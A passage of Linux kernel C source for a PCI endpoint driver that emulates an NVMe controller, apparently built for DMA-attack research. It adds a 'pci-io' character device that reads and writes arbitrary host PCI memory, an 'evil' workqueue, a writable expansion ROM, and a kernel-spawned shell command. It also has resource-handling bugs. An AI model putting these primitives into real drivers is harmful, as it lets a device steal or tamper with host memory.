	case nvme_admin_delete_cq:
		pci_epf_nvme_process_delete_cq(epf_nvme, epcmd);
		goto complete;

	case nvme_admin_delete_sq:
		pci_epf_nvme_process_delete_sq(epf_nvme, epcmd);
		goto complete;

	default:
		dev_err(&epf_nvme->epf->dev,
			"Unhandled admin command %s (0x%02x)\n",
			pci_epf_nvme_cmd_name(epcmd), cmd->common.opcode);
		epcmd->status = NVME_SC_INVALID_OPCODE | NVME_STATUS_DNR;
		goto complete;
	}

	/* Synchronously execute the command */
	pci_epf_nvme_exec_cmd(epcmd, post_exec_hook);

complete:
	pci_epf_nvme_complete_cmd(epcmd);
}

static inline size_t pci_epf_nvme_rw_data_len(struct pci_epf_nvme_cmd *epcmd)
{
	return ((u32)le16_to_cpu(epcmd->cmd.rw.length) + 1) <<
		epcmd->ns->head->lba_shift;
}

static void pci_epf_nvme_process_io_cmd(struct pci_epf_nvme_cmd *epcmd,
					struct pci_epf_nvme_queue *sq)
{
	struct pci_epf_nvme *epf_nvme = epcmd->epf_nvme;

	/* Get the command target namespace */
	epcmd->ns = nvme_find_get_ns(epf_nvme->ctrl.ctrl,
				     le32_to_cpu(epcmd->cmd.common.nsid));
	if (!epcmd->ns) {
		epcmd->status = NVME_SC_INVALID_NS | NVME_STATUS_DNR;
		goto complete;
	}

	switch (epcmd->cmd.common.opcode) {
	case nvme_cmd_read:
		epcmd->buffer_size = pci_epf_nvme_rw_data_len(epcmd);
		epcmd->dma_dir = DMA_TO_DEVICE;
		break;

	case nvme_cmd_write:
		epcmd->buffer_size = pci_epf_nvme_rw_data_len(epcmd);
		epcmd->dma_dir = DMA_FROM_DEVICE;
		break;

	case nvme_cmd_dsm:
		epcmd->buffer_size = (le32_to_cpu(epcmd->cmd.dsm.nr) + 1) *
			sizeof(struct nvme_dsm_range);
		epcmd->dma_dir = DMA_FROM_DEVICE;
		goto complete;

	case nvme_cmd_flush:
	case nvme_cmd_write_zeroes:
		break;

	default:
		dev_err(&epf_nvme->epf->dev,
			"Unhandled IO command %s (0x%02x)\n",
			pci_epf_nvme_cmd_name(epcmd),
			epcmd->cmd.common.opcode);
		epcmd->status = NVME_SC_INVALID_OPCODE | NVME_STATUS_DNR;
		goto complete;
	}

	queue_work(sq->cmd_wq, &epcmd->work);

	return;

complete:
	pci_epf_nvme_complete_cmd(epcmd);
}

static bool pci_epf_nvme_fetch_cmd(struct pci_epf_nvme *epf_nvme,
				   struct pci_epf_nvme_queue *sq)
{
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	struct pci_epf_nvme_cmd *epcmd;
	int ret;

	if (!(sq->qflags & PCI_EPF_NVME_QUEUE_LIVE))
		return false;

	sq->tail = pci_epf_nvme_reg_read32(ctrl, sq->db);
	if (sq->head == sq->tail)
		return false;

	ret = pci_epf_nvme_map_queue(epf_nvme, sq);
	if (ret)
		return false;

	while (sq->head != sq->tail) {
		epcmd = pci_epf_nvme_alloc_cmd(epf_nvme);
		if (!epcmd)
			break;

		/* Get the NVMe command submitted by the host */
		pci_epf_nvme_init_cmd(epf_nvme, epcmd, sq->qid, sq->cqid);
		memcpy_fromio(&epcmd->cmd,
			      sq->pci_map.virt_addr + sq->head * sq->qes,
			      sizeof(struct nvme_command));

		dev_dbg(&epf_nvme->epf->dev,
			"sq[%d]: head %d/%d, tail %d, command %s\n",
			sq->qid, (int)sq->head, (int)sq->depth,
			(int)sq->tail, pci_epf_nvme_cmd_name(epcmd));

		sq->head++;
		if (sq->head == sq->depth)
			sq->head = 0;

		list_add_tail(&epcmd->link, &sq->list);
	}

	pci_epf_nvme_unmap_queue(epf_nvme, sq);

	return !list_empty(&sq->list);
}

static void pci_epf_nvme_sq_work(struct work_struct *work)
{
	struct pci_epf_nvme_queue *sq =
		container_of(work, struct pci_epf_nvme_queue, work.work);
	struct pci_epf_nvme *epf_nvme = sq->epf_nvme;
	struct pci_epf_nvme_cmd *epcmd;
	unsigned long poll_interval = 1;
	unsigned long j = jiffies;

	while (pci_epf_nvme_ctrl_ready(epf_nvme) &&
	       (sq->qflags & PCI_EPF_NVME_QUEUE_LIVE)) {
		/*
		 * Try to get commands from the host. If We do not yet have any
		 * command, aggressively keep polling the SQ of IO queues for at
		 * most one tick and fall back to rescheduling the SQ work if we
		 * have not received any command after that. This hybrid
		 * spin-polling method significantly increases the IOPS for
		 * shallow queue depth operation (e.g. QD=1).
		 */
		if (!pci_epf_nvme_fetch_cmd(epf_nvme, sq)) {
			if (!sq->qid || jiffies > j + 1)
				break;
			usleep_range(1, 2);
			continue;
		}

		while (!list_empty(&sq->list)) {
			epcmd = list_first_entry(&sq->list,
						 struct pci_epf_nvme_cmd, link);
			list_del_init(&epcmd->link);
			if (sq->qid)
				pci_epf_nvme_process_io_cmd(epcmd, sq);
			else
				pci_epf_nvme_process_admin_cmd(epcmd);
		}
	}

	if (!pci_epf_nvme_ctrl_ready(epf_nvme))
		return;

	/* No need to aggressively poll the admin queue. */
	if (!sq->qid)
		poll_interval = msecs_to_jiffies(5);
	queue_delayed_work(epf_nvme->ctrl.wq, &sq->work, poll_interval);
}

static void pci_epf_nvme_cq_work(struct work_struct *work)
{
	struct pci_epf_nvme_queue *cq =
		container_of(work, struct pci_epf_nvme_queue, work.work);
	struct pci_epf_nvme *epf_nvme = cq->epf_nvme;
	struct pci_epf_nvme_cmd *epcmd;
	unsigned long flags;
	LIST_HEAD(list);
	int ret;

	spin_lock_irqsave(&cq->lock, flags);

	while (!list_empty(&cq->list)) {

		list_splice_tail_init(&cq->list, &list);
		spin_unlock_irqrestore(&cq->lock, flags);

		ret = pci_epf_nvme_map_queue(epf_nvme, cq);
		if (ret) {
			queue_delayed_work(epf_nvme->ctrl.wq, &cq->work, 1);
			return;
		}

		while (!list_empty(&list)) {
			epcmd = list_first_entry(&list,
						 struct pci_epf_nvme_cmd, link);
			list_del_init(&epcmd->link);
			if (!pci_epf_nvme_queue_response(epcmd))
				break;
		}

		pci_epf_nvme_unmap_queue(epf_nvme, cq);

		if (pci_epf_nvme_ctrl_ready(cq->epf_nvme))
			pci_epf_nvme_raise_irq(cq->epf_nvme, cq);

		spin_lock_irqsave(&cq->lock, flags);
	}

	/*
	 * Completions on the host may trigger issuing of new commands. Try to
	 * get these early to improve IOPS and reduce latency.
	 */
	if (cq->qid)
		queue_delayed_work(epf_nvme->ctrl.wq, &cq->sq->work, 0);

	spin_unlock_irqrestore(&cq->lock, flags);
}

static void pci_epf_nvme_reg_poll(struct work_struct *work)
{
	struct pci_epf_nvme *epf_nvme =
		container_of(work, struct pci_epf_nvme, reg_poll.work);
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	u32 old_cc;

	/* Set the controller register bar */
	ctrl->reg = epf_nvme->reg_bar;
	if (!ctrl->reg) {
		dev_err(&epf_nvme->epf->dev, "No register BAR set\n");
		goto again;
	}

	/* Check CC.EN to determine what we need to do */
	old_cc = ctrl->cc;
	ctrl->cc = pci_epf_nvme_reg_read32(ctrl, NVME_REG_CC);

	/* If not enabled yet, wait */
	if (!(old_cc & NVME_CC_ENABLE) && !(ctrl->cc & NVME_CC_ENABLE))
		goto again;

	/* If CC.EN was set by the host, enable the controller */
	if (!(old_cc & NVME_CC_ENABLE) && (ctrl->cc & NVME_CC_ENABLE)) {
		pci_epf_nvme_enable_ctrl(epf_nvme);
		goto again;
	}

	/* If CC.EN was cleared by the host, disable the controller */
	if (((old_cc & NVME_CC_ENABLE) && !(ctrl->cc & NVME_CC_ENABLE)) ||
	    ctrl->cc & NVME_CC_SHN_NORMAL)
		pci_epf_nvme_disable_ctrl(epf_nvme);

again:
	schedule_delayed_work(&epf_nvme->reg_poll, msecs_to_jiffies(5));
}

static int pci_epf_nvme_configure_bar(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);
	const struct pci_epc_features *features = epf_nvme->epc_features;
	size_t reg_size, reg_bar_size, exp_rom_size;
	size_t msix_table_size = 0;

	/*
	 * The first free BAR will be our register BAR and per NVMe
	 * specifications, it must be BAR 0.
	 */
	if (pci_epc_get_first_free_bar(features) != BAR_0) {
		dev_err(&epf->dev, "BAR 0 is not free\n");
		return -EINVAL;
	}

	/* Initialize BAR flags */
	if (features->bar[BAR_0].only_64bit)
		epf->bar[BAR_0].flags |= PCI_BASE_ADDRESS_MEM_TYPE_64;

	/*
	 * Calculate the size of the register bar: NVMe registers first with
	 * enough space for the doorbells, followed by the MSI-X table
	 * if supported.
	 */
	reg_size = NVME_REG_DBS + (PCI_EPF_NVME_MAX_NR_QUEUES * 2 * sizeof(u32));
	reg_size = ALIGN(reg_size, 8);

	if (features->msix_capable) {
		size_t pba_size;

		msix_table_size = PCI_MSIX_ENTRY_SIZE * epf->msix_interrupts;
		epf_nvme->msix_table_offset = reg_size;
		pba_size = ALIGN(DIV_ROUND_UP(epf->msix_interrupts, 8), 8);

		reg_size += msix_table_size + pba_size;
	}

	reg_bar_size = ALIGN(reg_size, 4096);

	if (features->bar[BAR_0].type == BAR_FIXED) {
		if (reg_bar_size > features->bar[BAR_0].fixed_size) {
			dev_err(&epf->dev,
				"Reg BAR 0 size %llu B too small, need %zu B\n",
				features->bar[BAR_0].fixed_size,
				reg_bar_size);
			return -ENOMEM;
		}
		reg_bar_size = features->bar[BAR_0].fixed_size;
	}

	epf_nvme->reg_bar = pci_epf_alloc_space(epf, reg_bar_size, BAR_0,
						features, PRIMARY_INTERFACE);
	if (!epf_nvme->reg_bar) {
		dev_err(&epf->dev, "Allocate register BAR failed\n");
		return -ENOMEM;
	}
	memset(epf_nvme->reg_bar, 0, reg_bar_size);

	exp_rom_size = ALIGN(SZ_64K, max(features->align, SZ_4K));
	if (features->bar[PCI_STD_NUM_BARS].type == BAR_FIXED) {
		exp_rom_size = features->bar[PCI_STD_NUM_BARS].fixed_size;
	}

	epf_nvme->exp_rom = pci_epf_alloc_space(epf, exp_rom_size,
						PCI_STD_NUM_BARS, features,
						PRIMARY_INTERFACE);

	if (!epf_nvme->exp_rom) {
		dev_err(&epf->dev, "Allocate expansion ROM failed\n");
		return -ENOMEM;
	}

	epf_nvme->exp_rom_size = exp_rom_size;

	return 0;
}

static void pci_epf_nvme_clear_bar(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);

	pci_epc_clear_bar(epf->epc, epf->func_no, epf->vfunc_no,
			  &epf->bar[BAR_0]);
	pci_epf_free_space(epf, epf_nvme->reg_bar, BAR_0, PRIMARY_INTERFACE);
	epf_nvme->reg_bar = NULL;
	pci_epc_clear_bar(epf->epc, epf->func_no, epf->vfunc_no,
			  &epf->bar[PCI_STD_NUM_BARS]);
	pci_epf_free_space(epf, epf_nvme->reg_bar, PCI_STD_NUM_BARS,
			   PRIMARY_INTERFACE);
	epf_nvme->exp_rom = NULL;
	epf_nvme->exp_rom_size = 0;
}

static int pci_epf_nvme_init_irq(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);
	int ret;

	/* Enable MSI-X if supported, otherwise, use MSI */
	if (epf_nvme->epc_features->msix_capable && epf->msix_interrupts) {
		ret = pci_epc_set_msix(epf->epc, epf->func_no, epf->vfunc_no,
				       epf->msix_interrupts, BAR_0,
				       epf_nvme->msix_table_offset);
		if (ret) {
			dev_err(&epf->dev, "MSI-X configuration failed\n");
			return ret;
		}

		epf_nvme->nr_vectors = epf->msix_interrupts;
		epf_nvme->irq_type = PCI_IRQ_MSIX;

		return 0;
	}

	if (epf_nvme->epc_features->msi_capable && epf->msi_interrupts) {
		ret = pci_epc_set_msi(epf->epc, epf->func_no, epf->vfunc_no,
				      epf->msi_interrupts);
		if (ret) {
			dev_err(&epf->dev, "MSI configuration failed\n");
			return ret;
		}

		epf_nvme->nr_vectors = epf->msi_interrupts;
		epf_nvme->irq_type = PCI_IRQ_MSI;

		return 0;
	}

	/* MSI and MSI-X are not supported: fall back to INTX */
	epf_nvme->nr_vectors = 1;
	epf_nvme->irq_type = PCI_IRQ_INTX;

	return 0;
}

static int pci_epf_nvme_epc_init(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);
	int ret;

	if (epf->vfunc_no <= 1) {
		/* Set device ID, class, etc */
		ret = pci_epc_write_header(epf->epc, epf->func_no, epf->vfunc_no,
					   epf->header);
		if (ret) {
			dev_err(&epf->dev,
				"Write configuration header failed %d\n", ret);
			return ret;
		}
	}

	/* Setup the PCIe BAR and enable interrupts */
	ret = pci_epc_set_bar(epf->epc, epf->func_no, epf->vfunc_no,
			      &epf->bar[BAR_0]);
	if (ret) {
		dev_err(&epf->dev, "Set BAR 0 failed\n");
		pci_epf_free_space(epf, epf_nvme->reg_bar, BAR_0,
				   PRIMARY_INTERFACE);
		return ret;
	}

	/* Setup the expansion ROM */
	ret = pci_epc_set_bar(epf->epc, epf->func_no, epf->vfunc_no,
			      &epf->bar[PCI_STD_NUM_BARS]);

	if (ret) {
		dev_err(&epf->dev, "Set expansion ROM failed\n");
	}

	ret = pci_epf_nvme_init_irq(epf);
	if (ret)
		return ret;

	pci_epf_nvme_init_ctrl_regs(epf);

	if (!epf_nvme->epc_features->linkup_notifier) {
		schedule_delayed_work(&epf_nvme->reg_poll, msecs_to_jiffies(5));
		/* If there is no notifier at all, assume link is up */
		epf_nvme->link_up = true;
	}

	return 0;
}

static void pci_epf_nvme_epc_deinit(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);

	/* Stop polling BAR registers and disable the controller */
	cancel_delayed_work_sync(&epf_nvme->reg_poll);

	pci_epf_nvme_delete_ctrl(epf);
	pci_epf_nvme_clean_dma(epf);
	pci_epf_nvme_clear_bar(epf);
}

static int pci_epf_nvme_link_up(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);

	dev_info(&epf->dev, "Link UP\n");
	epf_nvme->link_up = true;

	pci_epf_nvme_init_ctrl_regs(epf);

	/* Start polling the BAR registers to detect controller enable */
	schedule_delayed_work(&epf_nvme->reg_poll, 0);

	return 0;
}

static int pci_epf_nvme_link_down(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);

	dev_info(&epf->dev, "Link DOWN\n");
	epf_nvme->link_up = false;

	/* Stop polling BAR registers and disable the controller */
	cancel_delayed_work_sync(&epf_nvme->reg_poll);
	pci_epf_nvme_disable_ctrl(epf_nvme);

	return 0;
}

static const struct pci_epc_event_ops pci_epf_nvme_event_ops = {
	.epc_init = pci_epf_nvme_epc_init,
	.epc_deinit = pci_epf_nvme_epc_deinit,
	.link_up = pci_epf_nvme_link_up,
	.link_down = pci_epf_nvme_link_down,
};

static int pci_epf_nvme_bind(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);
	const struct pci_epc_features *epc_features;
	struct pci_epc *epc = epf->epc;
	bool dma_supported;
	int ret;

	if (!epc) {
		dev_err(&epf->dev, "No endpoint controller\n");
		return -EINVAL;
	}

	epc_features = pci_epc_get_features(epc, epf->func_no, epf->vfunc_no);
	if (!epc_features) {
		dev_err(&epf->dev, "epc_features not implemented\n");
		return -EOPNOTSUPP;
	}
	epf_nvme->epc_features = epc_features;

	ret = pci_epf_nvme_configure_bar(epf);
	if (ret)
		return ret;

	if (epf_nvme->dma_enable) {
		dma_supported = pci_epf_nvme_init_dma(epf_nvme);
		if (dma_supported) {
			dev_info(&epf->dev, "DMA supported\n");
		} else {
			dev_info(&epf->dev,
				 "DMA not supported, falling back to mmio\n");
			epf_nvme->dma_enable = false;
		}
	} else {
		dev_info(&epf->dev, "DMA disabled\n");
	}

	/* Create the fabrics host controller */
	ret = pci_epf_nvme_create_ctrl(epf);
	if (ret)
		goto clean_dma;

	return 0;

clean_dma:
	pci_epf_nvme_clean_dma(epf);
	pci_epf_nvme_clear_bar(epf);

	return ret;
}

static void pci_epf_nvme_unbind(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);
	struct pci_epc *epc = epf->epc;

	cancel_delayed_work_sync(&epf_nvme->reg_poll);

	pci_epf_nvme_delete_ctrl(epf);

	if (epc->init_complete) {
		pci_epf_nvme_clean_dma(epf);
		pci_epf_nvme_clear_bar(epf);
	}
}

static int pci_epf_nvme_pci_dev_open(struct inode* inode, struct file* file) {
	struct pci_epf_nvme_cdev_data *pencdd = container_of(inode->i_cdev,
		struct pci_epf_nvme_cdev_data, cdev);
	file->private_data = pencdd;
	return 0;
}

static ssize_t pci_epf_nvme_pci_dev_read(struct file* file, char* buffer, size_t len, loff_t* offset) {
	struct pci_epf_nvme_cdev_data *pencdd = file->private_data;
	struct pci_epf_nvme *epf_nvme = pencdd->epf_nvme;
	struct pci_epf *epf = epf_nvme->epf;
	struct device *dev = &epf->dev;
	struct pci_epf_nvme_segment seg;
	void* local_buffer = NULL;
	int error_count = 0;
	int ret = 0;
	size_t bytes_transfered = 0, btt = 0;
	const size_t LOCAL_BUFFER_SIZE = SZ_64K;
	if (!offset)
		return -EINVAL;

	if (!epf_nvme->link_up) {
		dev_warn(dev, "Link is down cannot read\n");
		return -EFAULT;
	}

	local_buffer = kzalloc(LOCAL_BUFFER_SIZE, GFP_KERNEL);
	if (!local_buffer)
		return -ENOMEM;

	dev_dbg(dev, "Request to read %zu bytes from offset 0x%llx\n", len, *offset);

	while (bytes_transfered < len) {
		btt = min(len - bytes_transfered, LOCAL_BUFFER_SIZE);
		//dev_dbg(dev, "btt: %zu, bytes_transfered: %zu\n", btt, bytes_transfered);
		seg.pci_addr = *offset + bytes_transfered;
		seg.size = btt;
		ret = pci_epf_nvme_transfer(epf_nvme, &seg, DMA_FROM_DEVICE, local_buffer);
		if (ret < 0) {
			dev_err(dev, "Failed to read over PCI\n");
			return ret;
		}
		/* Maybe this is possible in zero-copy */
		error_count += copy_to_user(buffer + bytes_transfered, local_buffer, btt);
		bytes_transfered += btt;
	}
	kfree(local_buffer);

	if (error_count != 0) {
		dev_err(dev, "Failed to send %d characters to the user\n", error_count);
		return -EFAULT;
	}

	*offset += len;
	return len;
}

static ssize_t pci_epf_nvme_pci_dev_write(struct file* file, const char* buffer, size_t len, loff_t* offset) {
	struct pci_epf_nvme_cdev_data *pencdd = file->private_data;
	struct pci_epf_nvme *epf_nvme = pencdd->epf_nvme;
	struct pci_epf *epf = epf_nvme->epf;
	struct device *dev = &epf->dev;
	struct pci_epf_nvme_segment seg;
	size_t bytes_transfered = 0, btt = 0;
	const size_t LOCAL_BUFFER_SIZE = SZ_64K;
	void* local_buffer = NULL;
	int ret = 0;
	if (!offset)
		return -EINVAL;

	dev_dbg(dev, "Request to write %zu bytes at offset 0x%llx\n", len, *offset);

	if (!epf_nvme->link_up) {
		dev_warn(dev, "Link is down cannot write\n");
		return -EFAULT;
	}

	local_buffer = kzalloc(LOCAL_BUFFER_SIZE, GFP_KERNEL);
	if (!local_buffer)
		return -ENOMEM;

	while (bytes_transfered < len) {
		btt = min(len - bytes_transfered, LOCAL_BUFFER_SIZE);
		//dev_dbg(dev, "btt: %zu, bytes_transfered: %zu\n", btt, bytes_transfered);
		/* Maybe this is possible in zero-copy */
		if (copy_from_user(local_buffer, buffer + bytes_transfered, btt)) {
			dev_err(dev, "Failed to copy data from user\n");
			return -EFAULT;
		}
		seg.pci_addr = *offset + bytes_transfered;
		seg.size = btt;
		ret = pci_epf_nvme_transfer(epf_nvme, &seg, DMA_TO_DEVICE, local_buffer);
		if (ret < 0) {
			dev_err(dev, "Failed to write over PCI\n");
			return ret;
		}
		bytes_transfered += btt;
	}
	kfree(local_buffer);

	*offset += len;
	return len;
}

static int pci_epf_nvme_pci_dev_release(struct inode* inode, struct file* file) {
	return 0;
}

static struct file_operations fops = {
	.open		= pci_epf_nvme_pci_dev_open,
	.read		= pci_epf_nvme_pci_dev_read,
	.write		= pci_epf_nvme_pci_dev_write,
	.release	= pci_epf_nvme_pci_dev_release,
};

static struct pci_epf_header epf_nvme_pci_header = {
	.vendorid	= PCI_ANY_ID,
	.deviceid	= PCI_ANY_ID,
	.progif_code	= 0x02, /* NVM Express */
	.baseclass_code = PCI_BASE_CLASS_STORAGE,
	.subclass_code	= 0x08, /* Non-Volatile Memory controller */
	.interrupt_pin	= PCI_INTERRUPT_INTA,
};

static int dev_major = 0;

static int pci_epf_nvme_probe(struct pci_epf *epf,
			      const struct pci_epf_device_id *id)
{
	struct pci_epf_nvme *epf_nvme;
	dev_t cdev;
	int ret = 0;

	/* This is just an example on how to call userspace commands from here */
	char *argv[] = { "/bin/sh", "-c", "echo Hello from kernel space! > /tmp/kernel_output.txt", NULL };
	static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin" , NULL};
	ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	if (ret != 0) {
		dev_err(&epf->dev,
			"call_usermodehelper() failed with return code: %d\n",
			ret);
	} else {
		dev_info(&epf->dev,
			 "User space program executed successfully\n");
	}

	epf_nvme = devm_kzalloc(&epf->dev, sizeof(*epf_nvme), GFP_KERNEL);
	if (!epf_nvme)
		return -ENOMEM;

	epf_nvme->epf = epf;
	INIT_DELAYED_WORK(&epf_nvme->reg_poll, pci_epf_nvme_reg_poll);

	epf_nvme->evil_wq = create_singlethread_workqueue("evil wq");
	if (!epf_nvme->evil_wq)
		return -ENOMEM;

	epf_nvme->prp_list_buf = devm_kzalloc(&epf->dev, NVME_CTRL_PAGE_SIZE,
					      GFP_KERNEL);
	if (!epf_nvme->prp_list_buf)
		return -ENOMEM;

	/* Set default attribute values */
	epf_nvme->dma_enable = true;
	epf_nvme->mdts_kb = PCI_EPF_NVME_MDTS_KB;

	epf->event_ops = &pci_epf_nvme_event_ops;
	epf->header = &epf_nvme_pci_header;
	epf_set_drvdata(epf, epf_nvme);

	/* allocate chardev region and assign Major number */
	ret = alloc_chrdev_region(&cdev, 0, 1, "nvme_pci_cdev");
	if (ret) {
		dev_err(&epf->dev, "Could not alloc chrdev region\n");
		return ret;
	}

	dev_major = MAJOR(cdev);

	/* Add char device that exposes PCI space */
	epf_nvme->char_class = class_create("nvme_pci_cdev");
	if (IS_ERR_OR_NULL(epf_nvme->char_class)) {
		dev_err(&epf->dev, "Could not create class\n");
		return PTR_ERR(epf_nvme->char_class);
	}

	cdev_init(&epf_nvme->chardev_data.cdev, &fops);
	epf_nvme->chardev_data.cdev.owner = THIS_MODULE;

	ret = cdev_add(&epf_nvme->chardev_data.cdev, MKDEV(dev_major, 0), 1);
	if (ret < 0) {
		dev_err(&epf->dev, "Could not add character device: %d\n", ret);
		return ret;
	}

	device_create(epf_nvme->char_class, NULL, MKDEV(dev_major, 0), NULL,
		      "pci-io");

	epf_nvme->chardev_data.epf_nvme = epf_nvme;

	return 0;
}

#define to_epf_nvme(epf_group)	\
	container_of((epf_group), struct pci_epf_nvme, group)

static ssize_t pci_epf_nvme_ctrl_opts_show(struct config_item *item,
					   char *page)
{
	struct config_group *group = to_config_group(item);
	struct pci_epf_nvme *epf_nvme = to_epf_nvme(group);

	if (!epf_nvme->ctrl_opts_buf)
		return 0;

	return sysfs_emit(page, "%s\n", epf_nvme->ctrl_opts_buf);
}

#define PCI_EPF_NVME_OPT_HIDDEN_NS	"hidden_ns"

static ssize_t pci_epf_nvme_ctrl_opts_store(struct config_item *item,
					    const char *page, size_t len)
{
	struct config_group *group = to_config_group(item);
	struct pci_epf_nvme *epf_nvme = to_epf_nvme(group);
	size_t opt_buf_size;

	/* Do not allow setting options when the function is already started */
	if (epf_nvme->ctrl.ctrl)
		return -EBUSY;

	if (!len)
		return -EINVAL;

	kfree(epf_nvme->ctrl_opts_buf);

	/*
	 * Make sure we have enough room to add the hidden_ns option
	 * if it is missing.
	 */
	opt_buf_size = len + strlen(PCI_EPF_NVME_OPT_HIDDEN_NS) + 2;
	epf_nvme->ctrl_opts_buf = kzalloc(opt_buf_size, GFP_KERNEL);
	if (!epf_nvme->ctrl_opts_buf)
		return -ENOMEM;

	strscpy(epf_nvme->ctrl_opts_buf, page, opt_buf_size);
	if (!strnstr(page, PCI_EPF_NVME_OPT_HIDDEN_NS, len))
		strncat(epf_nvme->ctrl_opts_buf,
			"," PCI_EPF_NVME_OPT_HIDDEN_NS, opt_buf_size);

	dev_dbg(&epf_nvme->epf->dev,
		"NVMe fabrics controller options: %s\n",
		epf_nvme->ctrl_opts_buf);

	return len;
}

CONFIGFS_ATTR(pci_epf_nvme_, ctrl_opts);

static ssize_t pci_epf_nvme_dma_enable_show(struct config_item *item,
					    char *page)
{
	struct config_group *group = to_config_group(item);
	struct pci_epf_nvme *epf_nvme = to_epf_nvme(group);

	return sysfs_emit(page, "%d\n", epf_nvme->dma_enable);
}

static ssize_t pci_epf_nvme_dma_enable_store(struct config_item *item,
					     const char *page, size_t len)
{
	struct config_group *group = to_config_group(item);
	struct pci_epf_nvme *epf_nvme = to_epf_nvme(group);
	int ret;

	if (epf_nvme->ctrl_enabled)
		return -EBUSY;

	ret = kstrtobool(page, &epf_nvme->dma_enable);
	if (ret)
		return ret;

	return len;
}

CONFIGFS_ATTR(pci_epf_nvme_, dma_enable);

static ssize_t pci_epf_nvme_mdts_kb_show(struct config_item *item, char *page)
{
	struct config_group *group = to_config_group(item);
	struct pci_epf_nvme *epf_nvme = to_epf_nvme(group);

	return sysfs_emit(page, "%zu\n", epf_nvme->mdts_kb);
}

static ssize_t pci_epf_nvme_mdts_kb_store(struct config_item *item,
					  const char *page, size_t len)
{
	struct config_group *group = to_config_group(item);
	struct pci_epf_nvme *epf_nvme = to_epf_nvme(group);
	unsigned long mdts_kb;
	int ret;

	if (epf_nvme->ctrl_enabled)
		return -EBUSY;

	ret = kstrtoul(page, 0, &mdts_kb);
	if (ret)
		return ret;
	if (!mdts_kb)
		mdts_kb = PCI_EPF_NVME_MDTS_KB;
	else if (mdts_kb > PCI_EPF_NVME_MAX_MDTS_KB)
		mdts_kb = PCI_EPF_NVME_MAX_MDTS_KB;

	if (!is_power_of_2(mdts_kb))
		return -EINVAL;

	epf_nvme->mdts_kb = mdts_kb;

	return len;
}

CONFIGFS_ATTR(pci_epf_nvme_, mdts_kb);

static ssize_t pci_epf_nvme_rom_read(struct config_item *item, void *buf,
				     size_t count)
{
	struct config_group *group = to_config_group(item);
	struct pci_epf_nvme *epf_nvme = to_epf_nvme(group);

	if (!epf_nvme->exp_rom || !epf_nvme->exp_rom_size)
		return -EIO;

	/* ConfigFS works as follows: when a read is performed from user space
	 * kernel space first issues a read with a NULL buf pointer, this is
	 * to get the size of the binary attribute, then it allocates buf with
	 * that size, then it issues a read again with that size, therefore the
	 * epf_nvme->exp_rom_size should not change between the calls otherwise
	 * a buffer overflow is possible
	 *
	 * See the code here : https://elixir.bootlin.com/linux/v6.12.6/source/fs/configfs/file.c#L124
	 *
	 * epf_nvme->exp_rom_size should be constant in this driver, but the
	 * check below that compares the read size and exp_rom_size makes sure
	 * of this.
	 */

	if (buf) {
		if (count == epf_nvme->exp_rom_size)
			memcpy(buf, epf_nvme->exp_rom, epf_nvme->exp_rom_size);
		else
			return -EINVAL;
	}

	return epf_nvme->exp_rom_size;
}

static ssize_t pci_epf_nvme_rom_write(struct config_item *item, const void *buf,
				      size_t count)
{
	struct config_group *group = to_config_group(item);
	struct pci_epf_nvme *epf_nvme = to_epf_nvme(group);

	/* This check is here becuase exp_rom_size is not a pure constant
	 * because it depends on to which PCIe EP controller the EP function is
	 * bound to.
	 */
	if (count > epf_nvme->exp_rom_size)
		return -E2BIG;

	memcpy(epf_nvme->exp_rom, buf, count);

	return count;
}

/** @todo the max size is endpoint controller dependent... */
CONFIGFS_BIN_ATTR(pci_epf_nvme_, rom, NULL, SZ_64K);

static struct configfs_attribute *pci_epf_nvme_attrs[] = {
	&pci_epf_nvme_attr_ctrl_opts,
	&pci_epf_nvme_attr_dma_enable,
	&pci_epf_nvme_attr_mdts_kb,
	NULL,
};

static struct configfs_bin_attribute *pci_epf_nvme_bin_attrs[] = {
	&pci_epf_nvme_attr_rom,
	NULL,
};

static const struct config_item_type pci_epf_nvme_group_type = {
	.ct_attrs	= pci_epf_nvme_attrs,
	.ct_bin_attrs	= pci_epf_nvme_bin_attrs,
	.ct_owner	= THIS_MODULE,
};

static struct config_group *pci_epf_nvme_add_cfs(struct pci_epf *epf,
						 struct config_group *group)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);

	/* Add the NVMe target attributes */
	config_group_init_type_name(&epf_nvme->group, "nvme",
				    &pci_epf_nvme_group_type);

	return &epf_nvme->group;
}

static const struct pci_epf_device_id pci_epf_nvme_ids[] = {
	{ .name = "pci_epf_nvme" },
	{},
};

static struct pci_epf_ops pci_epf_nvme_ops = {
	.bind	= pci_epf_nvme_bind,
	.unbind	= pci_epf_nvme_unbind,
	.add_cfs = pci_epf_nvme_add_cfs,
};

static struct pci_epf_driver epf_nvme_driver = {
	.driver.name	= "pci_epf_nvme",
	.probe		= pci_epf_nvme_probe,
	.id_table	= pci_epf_nvme_ids,
	.ops		= &pci_epf_nvme_ops,
	.owner		= THIS_MODULE,
};

static int __init pci_epf_nvme_init(void)
{
	int ret;

	pr_info("NVMe OoT Module built on %s at %s\n",
		__DATE__, __TIME__);

	epf_nvme_cmd_cache = kmem_cache_create("epf_nvme_cmd",
					sizeof(struct pci_epf_nvme_cmd),
					0, SLAB_HWCACHE_ALIGN, NULL);
	if (!epf_nvme_cmd_cache)
		return -ENOMEM;

	ret = pci_epf_register_driver(&epf_nvme_driver);
	if (ret)
		goto out_cache;

	pr_info("Registered nvme EPF driver\n");

	return 0;

out_cache:
	kmem_cache_destroy(epf_nvme_cmd_cache);

